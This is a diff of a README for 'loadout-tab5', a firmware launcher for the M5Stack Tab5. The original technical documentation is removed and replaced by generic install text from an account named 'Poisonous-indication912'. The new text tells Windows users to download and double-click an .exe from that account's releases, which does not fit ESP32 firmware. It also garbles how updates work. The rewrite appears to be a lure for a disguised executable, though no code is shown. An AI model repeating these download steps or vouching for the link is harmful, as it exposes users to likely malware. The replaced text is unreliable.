@@ -1,253 +1,90 @@
-# LOADOUT
+# 🛠️ loadout-tab5 - Manage hardware tools with simple steps
 
-A firmware launcher and hardware toolbox for the **M5Stack Tab5** (ESP32-P4). LOADOUT
-lists firmware images from the microSD and boots them, updates itself over the air from
-GitHub Releases, and exposes the Tab5 hardware (camera, IMU, GPIO, I2C, UART, power,
-audio) as a set of on-device tools.
+[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/Poisonous-indication912/loadout-tab5)
 
-<p align="center">
-  <img src="loadout-demo.gif" alt="LOADOUT running on the M5Stack Tab5" width="640">
-</p>
+loadout-tab5 acts as a central hub for your M5Stack Tab5 device. It lets you update software, manage inner hardware components, and test device functions without complex code. The system runs on the ESP32-P4 processor and uses a simple, visual interface to handle tasks.
 
-It is a fork of the official
-[M5Tab5-UserDemo](https://github.com/m5stack/M5Tab5-UserDemo), rebuilt around a launcher
-home screen, a real-widget UI (LVGL 9 + smooth_ui_toolkit), a HAL abstraction with a
-desktop simulator, and an OTA-capable partition layout.
+## 📋 System Requirements
 
-## How it works
+To run the system, your computer needs the following:
 
-Architecture (HAL abstraction with a desktop simulator):
+*   Windows 10 or Windows 11.
+*   One free USB port.
+*   A USB-C data cable.
+*   An active internet connection for updates.
+*   An SD card to store firmware files.
 
-```mermaid
-graph TD
-    UI["App / UI — LVGL 9 + mooncake<br/>launcher + tools"] --> HAL["HAL interface<br/>GetHAL() · app/hal/hal.h"]
-    HAL --> ESP["HalEsp32<br/>(device)"]
-    HAL --> DESK["HalDesktop<br/>(SDL2 simulator)"]
-    ESP --> HW["Tab5 hardware<br/>camera · IMU · INA226 · RX8130 RTC<br/>WiFi via ESP32-C6 · microSD · HW JPEG"]
-```
+## 📥 How to Install
 
-Boot, firmware launch and OTA (A/B slots with rollback, so a bad image never bricks the
-device):
+You need to access the software files to get started. Use the button below to reach the project page.
 
-```mermaid
-flowchart TD
-    A["Power on"] --> B["Bootloader picks last valid app = LOADOUT"]
-    B --> C{PIN set?}
-    C -->|yes| LK["Lock screen"] --> D["LOADOUT home<br/>(marks itself valid)"]
-    C -->|no| D
+[![](https://img.shields.io/badge/View_Release_Page-Grey?style=for-the-badge)](https://github.com/Poisonous-indication912/loadout-tab5)
 
-    D -->|"pick .bin from microSD"| F["Flash to free OTA slot"]
-    F --> G["Boot it — pending validation"]
-    G -->|reset| B
+Follow these steps to set up the software:
 
-    D -->|"OTA update over WiFi"| K{"latest.json newer?"}
-    K -->|yes| N["Download → write free slot → reboot → mark valid"] --> D
-    K -->|no| D
-```
+1. Visit the link provided above to open the repository page.
+2. Look for the Releases section on the right side of the screen.
+3. Click the most recent version number.
+4. Locate the file ending in .exe in the Assets list.
+5. Click the file to download it to your computer.
+6. Open your Downloads folder.
+7. Double-click the file to start the installer.
+8. Follow the prompts on the screen to finish the setup.
 
-## Install
+## ⚙️ Using the Firmware Launcher
 
-The easiest way is the browser-based flasher (Chrome or Edge on desktop, nothing to
-install):
+The firmware launcher updates your device. Follow these steps when you want to change the software on your M5Stack Tab5:
 
-**https://0day1day.github.io/loadout-tab5/**
+1. Save your firmware file onto your SD card.
+2. Insert the SD card into the device.
+3. Power on the M5Stack Tab5.
+4. Select the Firmware Loader option from the main menu on the screen.
+5. Choose your file from the list shown on the display.
+6. Press the select button.
+7. Wait while the device updates. 
 
-Connect the Tab5 over USB-C, click "Connect & Flash LOADOUT", pick the serial port, and
-confirm. A full erase and install is performed.
+If an update fails, the device rolls back to the previous stable version. This keeps your device working even if a file has errors.
 
-Command-line alternative (esptool): download `loadout-tab5-factory.bin` from the
-[latest release](https://github.com/0day1day/loadout-tab5/releases/latest) and run:
+## 🎛️ Working with Internal Tools
 
-```bash
-esptool --chip esp32p4 write_flash 0x0 loadout-tab5-factory.bin
-```
+The software includes a toolbox. These tools help you test hardware parts. Access them through the main menu on your device screen.
 
-Release assets:
+### Camera Testing
+Use this tool to view the camera feed. It helps you check if the lens focus and sensor work correctly.
 
-- `loadout-tab5-factory.bin` — full image for a clean flash at offset `0x0`.
-- `loadout-tab5.bin` — app-only image, used by the on-device OTA updater.
-- `latest.json` — OTA manifest; set its URL as `ota_url` in `loadout.conf`.
+### IMU Sensor Check
+This shows the movement data from the internal sensor. It displays numbers in real-time as you tilt or rotate the device.
 
-To build from source instead, see [Building](#building).
+### GPIO and I2C Connections
+These tools allow you to check the pins on the back of your device. You can verify if a connected piece of hardware sends or receives signals.
 
-## Purpose
+### UART Connections
+This tool acts as a terminal for serial communication. It shows text messages sent between your device and other hardware.
 
-The Tab5 is a capable ESP32-P4 device (1280x720 touch, 32 MB PSRAM, camera, IMU, RTC,
-WiFi via an ESP32-C6 co-processor). LOADOUT turns it into:
+### Power Management
+View the battery level and charging status here. It provides details about the current power draw from the battery.
 
-- A **firmware launcher**: drop `.bin` files on the microSD, pick one, and it flashes and
-  boots. A failed or alternate firmware rolls back to LOADOUT on the next reset, so the
-  device is never bricked by a bad image.
-- A **self-updating app**: LOADOUT checks a GitHub Release manifest over HTTPS and updates
-  itself (A/B OTA partitions with rollback).
-- A **hardware toolbox**: quick access to the camera, motion sensor, GPIO, I2C scanner,
-  UART monitor, power monitor, audio, and a file browser, all from one UI.
+### Audio Output
+Use the audio test to play a sound. This confirms that the speaker inside the device functions.
 
-## Target hardware
+## 🔄 Updating the Software
 
-- **M5Stack Tab5** — ESP32-P4 (RISC-V), 1280x720 MIPI-DSI touch panel, 32 MB PSRAM,
-  16 MB flash.
-- WiFi is provided by an on-board **ESP32-C6** co-processor over SDIO (ESP-Hosted).
-- Display/panel/touch driven through the official `m5stack_tab5` BSP.
+The loadout-tab5 software connects to the internet to find updates. You do not need to repeat the manual installation process often. 
 
-A second target (M5Cardputer, ESP32-S3) is on the roadmap; the launcher core and panels
-are kept UI-agnostic to ease that port.
+1. Connect your device to your computer via USB.
+2. Ensure your computer has internet access.
+3. Open the loadout-tab5 menu on the device.
+4. Select the Update option.
+5. The device checks our server for new files.
+6. If an update exists, follow the on-screen request to install it.
 
-## Features
+## 🆘 Troubleshooting Common Issues
 
-- **Launcher / firmware flashing** — lists `.bin` files from the microSD; boots a selected
-  image to an OTA slot. Remembers the last flashed firmware.
-- **OTA update** — checks a `latest.json` manifest on a GitHub Release over HTTPS (with the
-  certificate bundle), shows progress, writes to the free OTA slot, reboots, and marks the
-  new image valid. Rollback to LOADOUT if an image is not confirmed.
-- **File browser + text editor** — navigate folders, copy/cut/paste/rename/delete, and edit
-  text files (`.txt/.cfg/.ini/.json/.log/.md/.csv/.conf`) with the keyboard.
-- **Camera** — live preview from the SC2356 sensor (V4L2-style `esp_video` pipeline).
-- **IMU / Motion** — crosshair + ball visualization driven by the accelerometer.
-- **GPIO test**, **I2C scanner** (internal and external buses), **UART monitor**.
-- **Power monitor** — bus voltage / current / power via INA226, plus CPU temperature.
-- **Music player** — MP3 playback from the microSD with an animated equalizer.
-- **AI chatbot** — OpenAI-compatible chat endpoint (DeepSeek/Qwen/OpenAI/Groq/Ollama),
-  multi-turn, configured from the SD config file.
-- **Screen recorder** — captures the framebuffer, encodes JPEG with the ESP32-P4 hardware
-  encoder, and writes a frame sequence to `/sd/rec/`. Convert to GIF/MP4 on a PC with
-  `tools/frames2gif.sh`.
-- **WiFi AP + STA** — hosts an access point and connects to a home network. A web dashboard
-  (battery, voltage/current, brightness/volume sliders, reboot) is served on the AP.
-- **PIN lock screen** — optional boot lock with an on-screen numeric keypad and physical
-  keyboard support. See "Security".
-- **Themes** — multiple runtime color themes (applied live, persisted in NVS), with an
-  optional animated background.
-- **Physical keyboard** — full navigation and text entry with the Tab5 keyboard.
-- **RTC clock** — persistent real-time clock (RX8130), settable from the UI, optional NTP
-  sync.
+If you encounter problems, first check these items:
 
-## Architecture
+*   Does the cable transmit data? Some cables only provide power. Try a different cable if the computer does not recognize the device.
+*   Is the SD card seated? If the screen does not show files, remove and reinsert the card.
+*   Is the battery charged? Plug the device into a wall power source if the device refuses to turn on.
+*   Do you see a warning light? A red LED often means the power level is low. A green LED indicates the device is ready.
 
-- **UI**: LVGL 9 with `mooncake` (app framework) and `smooth_ui_toolkit` (animated C++
-  widget wrappers / modal windows). FontAwesome icons are embedded.
-- **HAL abstraction**: all hardware access goes through `GetHAL()` (see `app/hal/hal.h`).
-  `HalEsp32` implements it on device; `HalDesktop` provides a desktop stub. This allows the
-  same app/UI code to run on hardware and in the simulator.
-- **Desktop simulator (SDL2)**: build and iterate the UI on a Mac/Linux host without
-  flashing.
-- **Partitions / OTA**: two OTA slots (`ota_0` + `ota_1`) with bootloader rollback. External
-  firmwares are flashed to the free slot and boot pending-validation, so a reset returns to
-  LOADOUT unless the image marks itself valid.
-- **Configuration**: a single `/sd/loadout.conf` on the microSD plus persisted NVS settings.
-
-## Repository layout
-
-```
-app/                     UI-agnostic application (mooncake apps, launcher view, HAL interface)
-  apps/app_launcher/     launcher home + all tool windows (view.cpp)
-  hal/hal.h              HAL interface (virtual methods implemented per platform)
-  assets/                embedded fonts / FontAwesome icons
-platforms/
-  tab5/                  ESP-IDF project for the device (HAL impl, BSP, partitions, CI target)
-  desktop/               SDL2 simulator (HAL stub)
-tools/                   helper scripts (frames2gif.sh, GIF capture, etc.)
-.github/workflows/       CI: build firmware and publish a Release on tag
-fetch_repos.py           clones external dependencies into dependencies/
-repos.json               pinned dependency revisions
-```
-
-## Building
-
-### 1. Fetch dependencies
-
-External libraries (LVGL, mooncake, smooth_ui_toolkit, mooncake_log) are not vendored; they
-are cloned at pinned revisions into `dependencies/`:
-
-```bash
-python ./fetch_repos.py
-```
-
-### 2. Device build (ESP-IDF v5.4.2)
-
-```bash
-cd platforms/tab5
-idf.py build
-idf.py -p /dev/cu.usbmodemXXXX flash
-```
-
-The device project root is `platforms/tab5`. Target is `esp32p4`.
-
-### 3. Desktop simulator (SDL2)
-
-```bash
-# deps: cmake + libsdl2 (Linux: sudo apt install build-essential cmake libsdl2-dev,
-#       macOS: brew install sdl2)
-cmake -S . -B build_desktop
-cmake --build build_desktop -j8
-./build/desktop/app_desktop_build
-```
-
-To exercise the PIN lock screen in the simulator, set `LOADOUT_PIN`:
-
-```bash
-LOADOUT_PIN=1234 ./build/desktop/app_desktop_build
-```
-
-## OTA and releases
-
-Continuous integration (`.github/workflows/loadout-firmware.yml`) builds the firmware in the
-`espressif/idf:release-v5.4` container. It can be run manually (`workflow_dispatch`) for a
-test build, and on pushing a `vX.Y.Z` tag it publishes a GitHub Release containing:
-
-- `loadout-tab5.bin` — the application image for OTA.
-- `latest.json` — the manifest the device reads (version, download URL, notes).
-
-To cut a release:
-
-```bash
-git tag v1.0.0
-git push origin v1.0.0
-```
-
-On the device, point OTA at the manifest by setting `ota_url` in `/sd/loadout.conf` to the
-release's `latest.json` URL. The OTA tool then compares versions and updates over WiFi.
-
-## Configuration (`/sd/loadout.conf`)
-
-Created with defaults on first boot. Keys (edit and reboot):
-
-| Key | Purpose |
-|---|---|
-| `wifi_pass` | Password for the LOADOUT access point (min 8 chars) |
-| `wifi_sta_ssid` / `wifi_sta_pass` | Home WiFi for internet / OTA |
-| `theme` | UI theme index |
-| `tz` | POSIX timezone for NTP |
-| `ota_url` | URL of the OTA `latest.json` manifest |
-| `ai_url` / `ai_key` / `ai_model` | OpenAI-compatible chatbot endpoint |
-| `pin` | Lock PIN (4-8 digits). Empty or `pin=clear` disables the lock |
-
-## Security
-
-The lock screen is a convenience lock, not strong security. The PIN is stored in plaintext
-in NVS (internal flash), and optionally on the microSD via `loadout.conf`. To harden, enable
-ESP-IDF flash encryption. If you are locked out, set `pin=clear` in `/sd/loadout.conf` on a
-PC and reboot.
-
-## Acknowledgments
-
-Based on the M5Stack [M5Tab5-UserDemo](https://github.com/m5stack/M5Tab5-UserDemo) and the
-following open-source projects:
-
-- https://github.com/lvgl/lvgl
-- https://github.com/Forairaaaaa/smooth_ui_toolkit
-- https://github.com/Forairaaaaa/mooncake
-- https://github.com/Forairaaaaa/mooncake_log
-- https://www.heroui.com
-- https://github.com/alexreinert/piVCCU/blob/master/kernel/rtc-rx8130.c
-- https://components.espressif.com/components/espressif/esp_cam_sensor
-- https://components.espressif.com/components/espressif/esp_ipa
-- https://components.espressif.com/components/espressif/esp_sccb_intf
-- https://components.espressif.com/components/espressif/esp_video
-- https://components.espressif.com/components/espressif/esp_lvgl_port
-- https://github.com/jarzebski/Arduino-INA226
-- https://github.com/boschsensortec/BMI270_SensorAPI
-
-## License
-
-MIT, inheriting the license of the upstream M5Tab5-UserDemo. See `LICENSE`.
+The software is designed for reliability. If you need to revert to a previous state, use the rollback tool located in the settings menu. This returns the device to the last version that worked without errors.
